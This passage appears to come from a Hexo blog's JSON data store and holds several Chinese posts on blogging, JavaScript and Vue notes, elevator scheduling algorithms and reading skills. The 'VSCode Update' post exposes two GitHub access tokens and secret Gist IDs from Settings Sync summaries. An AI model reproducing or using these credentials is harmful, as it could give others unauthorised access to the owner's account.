来确定他的学识。\n\n判断掌握知识的标准，在《罗辑思维》里被界定为，知道、理解知识的运用方法及手段。\\\n或者说可以理解为，遇到问题，在大脑里有解决问题的思路与方法。相当于数据库的索引，可以快速调取知识，如果是庞杂的知识体量可以用静态资源目录的方式储存（类似于遇到问题用百度，但是要知道查询什么知识点）。\n\n所以我认为，blog的过程就是，大脑对 问题 和 知识点 进行`思考` 并 `建立索引`的过称。\n","source":"_posts/日常随笔.md","raw":"---\ntitle: 日常随笔\ndate: 2015-05-1 10:31:27\ntags: 感悟\ncategories: 日记\n---\n# 关于写blog的意义\n\n博客日志相当于一个日常记事本，可以理解为日记，学习笔记。\n\n工作的状态也是属于不停学习的状态，在我们遇到问题的时候，大脑进行思考，以及运用互联网解决问题的过程，都会收获 想法 与 知识。\n\n俗话说：好记性不如烂笔头。在保持勤思考的同时，也应该及时做记录。\n\n罗辑思维《如何成为一个高手》里讲到: 钱钟书虽然是响当当的文学家，但是家里是没有多少藏书的 ( 相对而言，不可片面认知 ) ，更多的是记笔记的笔记本。\n\n这就说明我们不应该以 `收集知识的总量` 来衡量 一个人的学识，而是应该判断 一个人 `掌握知识的总量` 来确定他的学识。\n\n判断掌握知识的标准，在《罗辑思维》里被界定为，知道、理解知识的运用方法及手段。\\\n或者说可以理解为，遇到问题，在大脑里有解决问题的思路与方法。相当于数据库的索引，可以快速调取知识，如果是庞杂的知识体量可以用静态资源目录的方式储存（类似于遇到问题用百度，但是要知道查询什么知识点）。\n\n所以我认为，blog的过程就是，大脑对 问题 和 知识点 进行`思考` 并 `建立索引`的过称。\n","slug":"日常随笔","published":1,"updated":"2018-05-10T02:52:38.874Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i274000lb8xjnb40qtps","content":"<h1 id=\"关于写blog的意义\"><a href=\"#关于写blog的意义\" class=\"headerlink\" title=\"关于写blog的意义\"></a>关于写blog的意义</h1><p>博客日志相当于一个日常记事本，可以理解为日记，学习笔记。</p>\n<p>工作的状态也是属于不停学习的状态，在我们遇到问题的时候，大脑进行思考，以及运用互联网解决问题的过程，都会收获 想法 与 知识。</p>\n<p>俗话说：好记性不如烂笔头。在保持勤思考的同时，也应该及时做记录。</p>\n<p>罗辑思维《如何成为一个高手》里讲到: 钱钟书虽然是响当当的文学家，但是家里是没有多少藏书的 ( 相对而言，不可片面认知 ) ，更多的是记笔记的笔记本。</p>\n<p>这就说明我们不应该以 <code>收集知识的总量</code> 来衡量 一个人的学识，而是应该判断 一个人 <code>掌握知识的总量</code> 来确定他的学识。</p>\n<p>判断掌握知识的标准，在《罗辑思维》里被界定为，知道、理解知识的运用方法及手段。\\<br>或者说可以理解为，遇到问题，在大脑里有解决问题的思路与方法。相当于数据库的索引，可以快速调取知识，如果是庞杂的知识体量可以用静态资源目录的方式储存（类似于遇到问题用百度，但是要知道查询什么知识点）。</p>\n<p>所以我认为，blog的过程就是，大脑对 问题 和 知识点 进行<code>思考</code> 并 <code>建立索引</code>的过称。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"关于写blog的意义\"><a href=\"#关于写blog的意义\" class=\"headerlink\" title=\"关于写blog的意义\"></a>关于写blog的意义</h1><p>博客日志相当于一个日常记事本，可以理解为日记，学习笔记。</p>\n<p>工作的状态也是属于不停学习的状态，在我们遇到问题的时候，大脑进行思考，以及运用互联网解决问题的过程，都会收获 想法 与 知识。</p>\n<p>俗话说：好记性不如烂笔头。在保持勤思考的同时，也应该及时做记录。</p>\n<p>罗辑思维《如何成为一个高手》里讲到: 钱钟书虽然是响当当的文学家，但是家里是没有多少藏书的 ( 相对而言，不可片面认知 ) ，更多的是记笔记的笔记本。</p>\n<p>这就说明我们不应该以 <code>收集知识的总量</code> 来衡量 一个人的学识，而是应该判断 一个人 <code>掌握知识的总量</code> 来确定他的学识。</p>\n<p>判断掌握知识的标准，在《罗辑思维》里被界定为，知道、理解知识的运用方法及手段。\\<br>或者说可以理解为，遇到问题，在大脑里有解决问题的思路与方法。相当于数据库的索引，可以快速调取知识，如果是庞杂的知识体量可以用静态资源目录的方式储存（类似于遇到问题用百度，但是要知道查询什么知识点）。</p>\n<p>所以我认为，blog的过程就是，大脑对 问题 和 知识点 进行<code>思考</code> 并 <code>建立索引</code>的过称。</p>\n"},{"title":"日常知识点","date":"2017-05-09T06:15:10.000Z","_content":"stringify: JSON转字符串\n\ntoString: 返回原型数组\n\nValueOf: 输出对象\n\ntoLocalString: 格式化时间字符串\n\nV-bind用法: 计算属性基于this依赖进行缓存\n\nComputed 与 Method 区别: Computed基于依赖缓存; Method每次都重新计算\n\n[前端-数据双向绑定](https://juejin.im/post/5af1980a6fb9a07acb3cd4e3)\n\n[node-爬虫](https://juejin.im/post/5af01d27f265da0b7f447ab6)\n\n[Git plugin](https://juejin.im/post/5af152c1518825673e359539)\n","source":"_posts/日常知识点.md","raw":"---\ntitle: 日常知识点\ndate: 2017-05-09 14:15:10\ntags: 日常知识点\ncategories: 知识点\n---\nstringify: JSON转字符串\n\ntoString: 返回原型数组\n\nValueOf: 输出对象\n\ntoLocalString: 格式化时间字符串\n\nV-bind用法: 计算属性基于this依赖进行缓存\n\nComputed 与 Method 区别: Computed基于依赖缓存; Method每次都重新计算\n\n[前端-数据双向绑定](https://juejin.im/post/5af1980a6fb9a07acb3cd4e3)\n\n[node-爬虫](https://juejin.im/post/5af01d27f265da0b7f447ab6)\n\n[Git plugin](https://juejin.im/post/5af152c1518825673e359539)\n","slug":"日常知识点","published":1,"updated":"2018-05-09T08:06:03.318Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i277000nb8xjjz6brqjs","content":"<p>stringify: JSON转字符串</p>\n<p>toString: 返回原型数组</p>\n<p>ValueOf: 输出对象</p>\n<p>toLocalString: 格式化时间字符串</p>\n<p>V-bind用法: 计算属性基于this依赖进行缓存</p>\n<p>Computed 与 Method 区别: Computed基于依赖缓存; Method每次都重新计算</p>\n<p><a href=\"https://juejin.im/post/5af1980a6fb9a07acb3cd4e3\" target=\"_blank\" rel=\"noopener\">前端-数据双向绑定</a></p>\n<p><a href=\"https://juejin.im/post/5af01d27f265da0b7f447ab6\" target=\"_blank\" rel=\"noopener\">node-爬虫</a></p>\n<p><a href=\"https://juejin.im/post/5af152c1518825673e359539\" target=\"_blank\" rel=\"noopener\">Git plugin</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>stringify: JSON转字符串</p>\n<p>toString: 返回原型数组</p>\n<p>ValueOf: 输出对象</p>\n<p>toLocalString: 格式化时间字符串</p>\n<p>V-bind用法: 计算属性基于this依赖进行缓存</p>\n<p>Computed 与 Method 区别: Computed基于依赖缓存; Method每次都重新计算</p>\n<p><a href=\"https://juejin.im/post/5af1980a6fb9a07acb3cd4e3\" target=\"_blank\" rel=\"noopener\">前端-数据双向绑定</a></p>\n<p><a href=\"https://juejin.im/post/5af01d27f265da0b7f447ab6\" target=\"_blank\" rel=\"noopener\">node-爬虫</a></p>\n<p><a href=\"https://juejin.im/post/5af152c1518825673e359539\" target=\"_blank\" rel=\"noopener\">Git plugin</a></p>\n"},{"title":"电梯调度算法","date":"2018-05-07T02:08:18.000Z","archives":"Algorithm","_content":"# [电梯调度算法](https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&mid=2247485724&idx=1&sn=dafa64c031677b7c46b56e34d32c04ed&chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&mpshare=1&scene=23&srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd)\n\n## ---传统电梯调度算法---\n### 1.1 先来先服务算法（FCFS）\n\n  先来先服务（FCFS-First Come First Serve）算法\n\n### 1.2 最短寻找楼层时间优先算法（SSTF）\n\n### 1.3 扫描算法（SCAN）\n\n### 1.4 LOOK 算法\n\n### 1.5 SATF 算法\n\n## ---实时电梯调度算法---\n### 2.1 最早截止期优先调度算法\n\n### 2.2 SCAN-EDF 算法\n\n### 2.3 PI 算法\n\n### 2.4 FD-SCAN 算法\n\n## ---电梯调度高水平研究---\n以上两节介绍了几种简单的电梯调度算法。\n\n但是并不是说目前电梯调度只发展到这个层次。目前电梯的控制技术已经进入了电梯`群控`的时代。\n\n随着微机在电梯系统中的应用和人工智能技术的发展，智能群控技术得以迅速发展起来。\n\n由此，电梯的`群控`方面陆续发展出了一批新方法，包括：\n基于`专家系统`的电梯群控方法、\n基于`模糊逻辑`的电梯群控方法、\n基于`遗产算法`的电梯群控方法、\n基于`神经网络`的电梯群控方法、\n基于`模糊神经网络`的电梯群控方法。\n\n## ---电梯问题的需求分析---\n\n### 4.1 电梯的初始状态\n\n### 4.2 电梯基本功能\n\n### 4.3 电梯按钮功能\n\n## 结束语\n\n可能这些算法都不是一个最佳方案，只是它确实解决了一定情况的问题。\n\n但是，对一个优秀的程序员而言，研究各种算法是无比快乐的。\n\n[查看原文](https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&mid=2247485724&idx=1&sn=dafa64c031677b7c46b56e34d32c04ed&chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&mpshare=1&scene=23&srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd)\n\n另：\n[【知名互联网公司面试中常见的算法题】](https://www.zhihu.com/question/24964987)\n","source":"_posts/电梯调度算法.md","raw":"---\ntitle: 电梯调度算法\ndate: 2018-05-07 10:08:18\ntags: 调度算法\narchives: Algorithm\ncategories: 算法\n---\n# [电梯调度算法](https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&mid=2247485724&idx=1&sn=dafa64c031677b7c46b56e34d32c04ed&chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&mpshare=1&scene=23&srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd)\n\n## ---传统电梯调度算法---\n### 1.1 先来先服务算法（FCFS）\n\n  先来先服务（FCFS-First Come First Serve）算法\n\n### 1.2 最短寻找楼层时间优先算法（SSTF）\n\n### 1.3 扫描算法（SCAN）\n\n### 1.4 LOOK 算法\n\n### 1.5 SATF 算法\n\n## ---实时电梯调度算法---\n### 2.1 最早截止期优先调度算法\n\n### 2.2 SCAN-EDF 算法\n\n### 2.3 PI 算法\n\n### 2.4 FD-SCAN 算法\n\n## ---电梯调度高水平研究---\n以上两节介绍了几种简单的电梯调度算法。\n\n但是并不是说目前电梯调度只发展到这个层次。目前电梯的控制技术已经进入了电梯`群控`的时代。\n\n随着微机在电梯系统中的应用和人工智能技术的发展，智能群控技术得以迅速发展起来。\n\n由此，电梯的`群控`方面陆续发展出了一批新方法，包括：\n基于`专家系统`的电梯群控方法、\n基于`模糊逻辑`的电梯群控方法、\n基于`遗产算法`的电梯群控方法、\n基于`神经网络`的电梯群控方法、\n基于`模糊神经网络`的电梯群控方法。\n\n## ---电梯问题的需求分析---\n\n### 4.1 电梯的初始状态\n\n### 4.2 电梯基本功能\n\n### 4.3 电梯按钮功能\n\n## 结束语\n\n可能这些算法都不是一个最佳方案，只是它确实解决了一定情况的问题。\n\n但是，对一个优秀的程序员而言，研究各种算法是无比快乐的。\n\n[查看原文](https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&mid=2247485724&idx=1&sn=dafa64c031677b7c46b56e34d32c04ed&chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&mpshare=1&scene=23&srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd)\n\n另：\n[【知名互联网公司面试中常见的算法题】](https://www.zhihu.com/question/24964987)\n","slug":"电梯调度算法","published":1,"updated":"2018-07-06T00:07:55.037Z","_id":"cjj87i27a000rb8xjomcq2p2o","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"电梯调度算法\"><a href=\"#电梯调度算法\" class=\"headerlink\" title=\"电梯调度算法\"></a><a href=\"https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&amp;mid=2247485724&amp;idx=1&amp;sn=dafa64c031677b7c46b56e34d32c04ed&amp;chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&amp;mpshare=1&amp;scene=23&amp;srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd\" target=\"_blank\" rel=\"noopener\">电梯调度算法</a></h1><h2 id=\"—传统电梯调度算法—\"><a href=\"#—传统电梯调度算法—\" class=\"headerlink\" title=\"—传统电梯调度算法—\"></a>—传统电梯调度算法—</h2><h3 id=\"1-1-先来先服务算法（FCFS）\"><a href=\"#1-1-先来先服务算法（FCFS）\" class=\"headerlink\" title=\"1.1 先来先服务算法（FCFS）\"></a>1.1 先来先服务算法（FCFS）</h3><p>  先来先服务（FCFS-First Come First Serve）算法</p>\n<h3 id=\"1-2-最短寻找楼层时间优先算法（SSTF）\"><a href=\"#1-2-最短寻找楼层时间优先算法（SSTF）\" class=\"headerlink\" title=\"1.2 最短寻找楼层时间优先算法（SSTF）\"></a>1.2 最短寻找楼层时间优先算法（SSTF）</h3><h3 id=\"1-3-扫描算法（SCAN）\"><a href=\"#1-3-扫描算法（SCAN）\" class=\"headerlink\" title=\"1.3 扫描算法（SCAN）\"></a>1.3 扫描算法（SCAN）</h3><h3 id=\"1-4-LOOK-算法\"><a href=\"#1-4-LOOK-算法\" class=\"headerlink\" title=\"1.4 LOOK 算法\"></a>1.4 LOOK 算法</h3><h3 id=\"1-5-SATF-算法\"><a href=\"#1-5-SATF-算法\" class=\"headerlink\" title=\"1.5 SATF 算法\"></a>1.5 SATF 算法</h3><h2 id=\"—实时电梯调度算法—\"><a href=\"#—实时电梯调度算法—\" class=\"headerlink\" title=\"—实时电梯调度算法—\"></a>—实时电梯调度算法—</h2><h3 id=\"2-1-最早截止期优先调度算法\"><a href=\"#2-1-最早截止期优先调度算法\" class=\"headerlink\" title=\"2.1 最早截止期优先调度算法\"></a>2.1 最早截止期优先调度算法</h3><h3 id=\"2-2-SCAN-EDF-算法\"><a href=\"#2-2-SCAN-EDF-算法\" class=\"headerlink\" title=\"2.2 SCAN-EDF 算法\"></a>2.2 SCAN-EDF 算法</h3><h3 id=\"2-3-PI-算法\"><a href=\"#2-3-PI-算法\" class=\"headerlink\" title=\"2.3 PI 算法\"></a>2.3 PI 算法</h3><h3 id=\"2-4-FD-SCAN-算法\"><a href=\"#2-4-FD-SCAN-算法\" class=\"headerlink\" title=\"2.4 FD-SCAN 算法\"></a>2.4 FD-SCAN 算法</h3><h2 id=\"—电梯调度高水平研究—\"><a href=\"#—电梯调度高水平研究—\" class=\"headerlink\" title=\"—电梯调度高水平研究—\"></a>—电梯调度高水平研究—</h2><p>以上两节介绍了几种简单的电梯调度算法。</p>\n<p>但是并不是说目前电梯调度只发展到这个层次。目前电梯的控制技术已经进入了电梯<code>群控</code>的时代。</p>\n<p>随着微机在电梯系统中的应用和人工智能技术的发展，智能群控技术得以迅速发展起来。</p>\n<p>由此，电梯的<code>群控</code>方面陆续发展出了一批新方法，包括：<br>基于<code>专家系统</code>的电梯群控方法、<br>基于<code>模糊逻辑</code>的电梯群控方法、<br>基于<code>遗产算法</code>的电梯群控方法、<br>基于<code>神经网络</code>的电梯群控方法、<br>基于<code>模糊神经网络</code>的电梯群控方法。</p>\n<h2 id=\"—电梯问题的需求分析—\"><a href=\"#—电梯问题的需求分析—\" class=\"headerlink\" title=\"—电梯问题的需求分析—\"></a>—电梯问题的需求分析—</h2><h3 id=\"4-1-电梯的初始状态\"><a href=\"#4-1-电梯的初始状态\" class=\"headerlink\" title=\"4.1 电梯的初始状态\"></a>4.1 电梯的初始状态</h3><h3 id=\"4-2-电梯基本功能\"><a href=\"#4-2-电梯基本功能\" class=\"headerlink\" title=\"4.2 电梯基本功能\"></a>4.2 电梯基本功能</h3><h3 id=\"4-3-电梯按钮功能\"><a href=\"#4-3-电梯按钮功能\" class=\"headerlink\" title=\"4.3 电梯按钮功能\"></a>4.3 电梯按钮功能</h3><h2 id=\"结束语\"><a href=\"#结束语\" class=\"headerlink\" title=\"结束语\"></a>结束语</h2><p>可能这些算法都不是一个最佳方案，只是它确实解决了一定情况的问题。</p>\n<p>但是，对一个优秀的程序员而言，研究各种算法是无比快乐的。</p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&amp;mid=2247485724&amp;idx=1&amp;sn=dafa64c031677b7c46b56e34d32c04ed&amp;chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&amp;mpshare=1&amp;scene=23&amp;srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd\" target=\"_blank\" rel=\"noopener\">查看原文</a></p>\n<p>另：<br><a href=\"https://www.zhihu.com/question/24964987\" target=\"_blank\" rel=\"noopener\">【知名互联网公司面试中常见的算法题】</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"电梯调度算法\"><a href=\"#电梯调度算法\" class=\"headerlink\" title=\"电梯调度算法\"></a><a href=\"https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&amp;mid=2247485724&amp;idx=1&amp;sn=dafa64c031677b7c46b56e34d32c04ed&amp;chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&amp;mpshare=1&amp;scene=23&amp;srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd\" target=\"_blank\" rel=\"noopener\">电梯调度算法</a></h1><h2 id=\"—传统电梯调度算法—\"><a href=\"#—传统电梯调度算法—\" class=\"headerlink\" title=\"—传统电梯调度算法—\"></a>—传统电梯调度算法—</h2><h3 id=\"1-1-先来先服务算法（FCFS）\"><a href=\"#1-1-先来先服务算法（FCFS）\" class=\"headerlink\" title=\"1.1 先来先服务算法（FCFS）\"></a>1.1 先来先服务算法（FCFS）</h3><p>  先来先服务（FCFS-First Come First Serve）算法</p>\n<h3 id=\"1-2-最短寻找楼层时间优先算法（SSTF）\"><a href=\"#1-2-最短寻找楼层时间优先算法（SSTF）\" class=\"headerlink\" title=\"1.2 最短寻找楼层时间优先算法（SSTF）\"></a>1.2 最短寻找楼层时间优先算法（SSTF）</h3><h3 id=\"1-3-扫描算法（SCAN）\"><a href=\"#1-3-扫描算法（SCAN）\" class=\"headerlink\" title=\"1.3 扫描算法（SCAN）\"></a>1.3 扫描算法（SCAN）</h3><h3 id=\"1-4-LOOK-算法\"><a href=\"#1-4-LOOK-算法\" class=\"headerlink\" title=\"1.4 LOOK 算法\"></a>1.4 LOOK 算法</h3><h3 id=\"1-5-SATF-算法\"><a href=\"#1-5-SATF-算法\" class=\"headerlink\" title=\"1.5 SATF 算法\"></a>1.5 SATF 算法</h3><h2 id=\"—实时电梯调度算法—\"><a href=\"#—实时电梯调度算法—\" class=\"headerlink\" title=\"—实时电梯调度算法—\"></a>—实时电梯调度算法—</h2><h3 id=\"2-1-最早截止期优先调度算法\"><a href=\"#2-1-最早截止期优先调度算法\" class=\"headerlink\" title=\"2.1 最早截止期优先调度算法\"></a>2.1 最早截止期优先调度算法</h3><h3 id=\"2-2-SCAN-EDF-算法\"><a href=\"#2-2-SCAN-EDF-算法\" class=\"headerlink\" title=\"2.2 SCAN-EDF 算法\"></a>2.2 SCAN-EDF 算法</h3><h3 id=\"2-3-PI-算法\"><a href=\"#2-3-PI-算法\" class=\"headerlink\" title=\"2.3 PI 算法\"></a>2.3 PI 算法</h3><h3 id=\"2-4-FD-SCAN-算法\"><a href=\"#2-4-FD-SCAN-算法\" class=\"headerlink\" title=\"2.4 FD-SCAN 算法\"></a>2.4 FD-SCAN 算法</h3><h2 id=\"—电梯调度高水平研究—\"><a href=\"#—电梯调度高水平研究—\" class=\"headerlink\" title=\"—电梯调度高水平研究—\"></a>—电梯调度高水平研究—</h2><p>以上两节介绍了几种简单的电梯调度算法。</p>\n<p>但是并不是说目前电梯调度只发展到这个层次。目前电梯的控制技术已经进入了电梯<code>群控</code>的时代。</p>\n<p>随着微机在电梯系统中的应用和人工智能技术的发展，智能群控技术得以迅速发展起来。</p>\n<p>由此，电梯的<code>群控</code>方面陆续发展出了一批新方法，包括：<br>基于<code>专家系统</code>的电梯群控方法、<br>基于<code>模糊逻辑</code>的电梯群控方法、<br>基于<code>遗产算法</code>的电梯群控方法、<br>基于<code>神经网络</code>的电梯群控方法、<br>基于<code>模糊神经网络</code>的电梯群控方法。</p>\n<h2 id=\"—电梯问题的需求分析—\"><a href=\"#—电梯问题的需求分析—\" class=\"headerlink\" title=\"—电梯问题的需求分析—\"></a>—电梯问题的需求分析—</h2><h3 id=\"4-1-电梯的初始状态\"><a href=\"#4-1-电梯的初始状态\" class=\"headerlink\" title=\"4.1 电梯的初始状态\"></a>4.1 电梯的初始状态</h3><h3 id=\"4-2-电梯基本功能\"><a href=\"#4-2-电梯基本功能\" class=\"headerlink\" title=\"4.2 电梯基本功能\"></a>4.2 电梯基本功能</h3><h3 id=\"4-3-电梯按钮功能\"><a href=\"#4-3-电梯按钮功能\" class=\"headerlink\" title=\"4.3 电梯按钮功能\"></a>4.3 电梯按钮功能</h3><h2 id=\"结束语\"><a href=\"#结束语\" class=\"headerlink\" title=\"结束语\"></a>结束语</h2><p>可能这些算法都不是一个最佳方案，只是它确实解决了一定情况的问题。</p>\n<p>但是，对一个优秀的程序员而言，研究各种算法是无比快乐的。</p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&amp;mid=2247485724&amp;idx=1&amp;sn=dafa64c031677b7c46b56e34d32c04ed&amp;chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&amp;mpshare=1&amp;scene=23&amp;srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd\" target=\"_blank\" rel=\"noopener\">查看原文</a></p>\n<p>另：<br><a href=\"https://www.zhihu.com/question/24964987\" target=\"_blank\" rel=\"noopener\">【知名互联网公司面试中常见的算法题】</a></p>\n"},{"title":"获取MAC地址","date":"2018-06-22T06:24:02.000Z","_content":"## Node模块获取MAC地址\n\n[阅读原文](https://www.npmjs.com/package/address)\n","source":"_posts/获取MAC地址.md","raw":"---\ntitle: 获取MAC地址\ndate: 2018-06-22 14:24:02\ntags: Node获取MAC地址\ncategories: Node\n---\n## Node模块获取MAC地址\n\n[阅读原文](https://www.npmjs.com/package/address)\n","slug":"获取MAC地址","published":1,"updated":"2018-06-23T01:54:28.280Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i27c000tb8xj7s5qzkvb","content":"<h2 id=\"Node模块获取MAC地址\"><a href=\"#Node模块获取MAC地址\" class=\"headerlink\" title=\"Node模块获取MAC地址\"></a>Node模块获取MAC地址</h2><p><a href=\"https://www.npmjs.com/package/address\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Node模块获取MAC地址\"><a href=\"#Node模块获取MAC地址\" class=\"headerlink\" title=\"Node模块获取MAC地址\"></a>Node模块获取MAC地址</h2><p><a href=\"https://www.npmjs.com/package/address\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"阅读理解","date":"2018-04-20T02:51:01.000Z","archives":"大脑训练","_content":"为什么你的阅读速度慢、理解力低？\n\n## 视觉商数\n\n## 阅读习惯\n\n## 记忆理解习惯<br>\n+ 理解能力的增强也会提升记忆力，因为记忆的基础就是大脑根据信息组织意义的能力。\n","source":"_posts/阅读理解.md","raw":"---\ntitle: 阅读理解\ndate: 2018-04-20 10:51:01\ntags: 文学技能\narchives: 大脑训练\ncategories: 文学技能\n---\n为什么你的阅读速度慢、理解力低？\n\n## 视觉商数\n\n## 阅读习惯\n\n## 记忆理解习惯<br>\n+ 理解能力的增强也会提升记忆力，因为记忆的基础就是大脑根据信息组织意义的能力。\n","slug":"阅读理解","published":1,"updated":"2018-05-09T02:15:52.639Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i27d000vb8xjkpqw9xx9","content":"<p>为什么你的阅读速度慢、理解力低？</p>\n<h2 id=\"视觉商数\"><a href=\"#视觉商数\" class=\"headerlink\" title=\"视觉商数\"></a>视觉商数</h2><h2 id=\"阅读习惯\"><a href=\"#阅读习惯\" class=\"headerlink\" title=\"阅读习惯\"></a>阅读习惯</h2><h2 id=\"记忆理解习惯\"><a href=\"#记忆理解习惯\" class=\"headerlink\" title=\"记忆理解习惯\"></a>记忆理解习惯<br></h2><ul>\n<li>理解能力的增强也会提升记忆力，因为记忆的基础就是大脑根据信息组织意义的能力。</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<p>为什么你的阅读速度慢、理解力低？</p>\n<h2 id=\"视觉商数\"><a href=\"#视觉商数\" class=\"headerlink\" title=\"视觉商数\"></a>视觉商数</h2><h2 id=\"阅读习惯\"><a href=\"#阅读习惯\" class=\"headerlink\" title=\"阅读习惯\"></a>阅读习惯</h2><h2 id=\"记忆理解习惯\"><a href=\"#记忆理解习惯\" class=\"headerlink\" title=\"记忆理解习惯\"></a>记忆理解习惯<br></h2><ul>\n<li>理解能力的增强也会提升记忆力，因为记忆的基础就是大脑根据信息组织意义的能力。</li>\n</ul>\n"},{"title":"VSCode Update","date":"2018-05-11T01:15:17.000Z","_content":"\nCODE SETTINGS SYNC UPLOAD SUMMARY\n\nVersion: 2.9.2\n\n--------------------\nGitHub Token: a445a630bcdbb6a32670317533c559de9533d8f3\n\nGitHub Gist: 12d91e8460e10f3c9083b82a25623363\n\nGitHub Gist Type: Secret\n\nRestarting Visual Studio Code may be required to apply color and file icon theme.\n\n--------------------\nFiles Uploaded:\n\n  javascript.json > snippets | javascript.json\n\n  Extensions Removed:\n\nExtensions Added: \\\n  Angular2 v6.0.0 \\\n  background v1.1.17 \\\n  beautify v1.3.0 \\\n  bracket-pair-colorizer v1.0.48 \\\n  code-gnu-global v0.2.2 \\\n  code-settings-sync v2.9.2 \\\n  cpptools v0.17.0 \\\n  ejs-language-support v0.0.1 \\\n  ejs-snippets v0.1.0 \\\n  git-project-manager v1.5.1 \\\n  githistory v0.4.0 \\\n  gitlens v8.2.4 \\\n  html-snippets v0.2.1 \\\n  java v0.24.0 \\\n  javascript-ejs-support v0.3.2 \\\n  JavaScriptSnippets v1.6.0 \\\n  jquerysnippets v0.0.1 \\\n  language-stylus v1.9.2 \\\n  mongoose-os-ide v0.3.0 \\\n  mssql v1.3.1 \\\n  node-module-intellisense v1.5.0 \\\n  npm-intellisense v1.3.0 \\\n  python v2018.4.0 \\\n  tslint v1.0.28 \\\n  vetur v0.11.7 \\\n  view-in-browser v0.0.5 \\\n  vscode-eslint v1.4.8 \\\n  vscode-great-icons v2.1.31 \\\n  vscode-html-css v0.2.0 \\\n  vscode-icons v7.23.0 \\\n  vscode-java-debug v0.9.0 \\\n  vscode-language-babel v0.0.14 \\\n  vscode-language-pack-zh-hans v1.23.4 \\\n  vscode-map-preview v0.4.2 \\\n  vscode-maven v0.7.0 \\\n  vscode-mongodb v0.0.2 \\\n  vscode-npm-script v0.3.4 \\\n  vscode-preview-server v1.0.1 \\\n  vue-vscode-snippets v1.3.0 \\\n  weex v0.4.0 \\\n  xml v1.9.2\n  \n--------------------\nDone.\n\n--------------------\n\n## 2018年5月23日 14:37:12\n\nCODE SETTINGS SYNC UPLOAD SUMMARY\n\nVersion: 2.9.2\n\n--------------------\n\nGitHub Token: **c49d7c88a2236d998b043830034a10d1b00ca5df**\n\n**GitHub Gist: daeb8021fc8862ba3a1fe162cc301c7c**\n\nGitHub Gist Type: Secret\n\nRestarting Visual Studio Code may be required to apply color and file icon theme.\n\n--------------------\n\nFiles Uploaded:\n\n  javascript.json > snippets|javascript.json\n\n  Extensions Removed:\n\nExtensions Added:\\\n  Angular2 v6.1.1\\\n  background v1.1.17\\\n  beautify v1.3.0\\\n  bracket-pair-colorizer v1.0.53\\\n  code-gnu-global v0.2.2\\\n  code-settings-sync v2.9.2\\\n  cpptools v0.17.3\\\n  ejs-language-support v0.0.1\\\n  ejs-snippets v0.1.0\\\n  git-project-manager v1.6.1\\\n  githistory v0.4.1\\\n  gitlens v8.3.2\\\n  html-snippets v0.2.1\\\n  java v0.25.0\\\n  javascript-ejs-support v0.3.2\\\n  JavaScriptSnippets v1.6.0\\\n  jquerysnippets v0.0.1\\\n  language-stylus v1.9.2\\\n  mongoose-os-ide v0.3.0\\\n  mssql v1.3.1\\\n  node-module-intellisense v1.5.0\\\n  npm-intellisense v1.3.0\\\n  python v2018.4.0\\\n  tslint v1.0.29\\\n  vetur v0.12.3\\\n  view-in-browser v0.0.5\\\n  vscode-eslint v1.4.10\\\n  vscode-great-icons v2.1.32\\\n  vscode-html-css v0.2.0\\\n  vscode-icons v7.23.0\\\n  vscode-java-debug v0.9.0\\\n  vscode-language-babel v0.0.14\\\n  vscode-language-pack-zh-hans v1.23.5\\\n  vscode-map-preview v0.4.2\\\n  vscode-maven v0.8.0\\\n  vscode-mongodb v0.0.2\\\n  vscode-npm-script v0.3.4\\\n  vscode-preview-server v1.0.1\\\n  vue-vscode-snippets v1.3.0\\\n  weex v0.4.0\\\n  xml v1.9.2\n  \n--------------------\nDone.","source":"_posts/Editor/VSCode-Update.md","raw":"---\ntitle: VSCode Update\ndate: 2018-05-11 09:15:17\ntags: 编辑器更新\ncategories: VSCode\n---\n\nCODE SETTINGS SYNC UPLOAD SUMMARY\n\nVersion: 2.9.2\n\n--------------------\nGitHub Token: a445a630bcdbb6a32670317533c559de9533d8f3\n\nGitHub Gist: 12d91e8460e10f3c9083b82a25623363\n\nGitHub Gist Type: Secret\n\nRestarting Visual Studio Code may be required to apply color and file icon theme.\n\n--------------------\nFiles 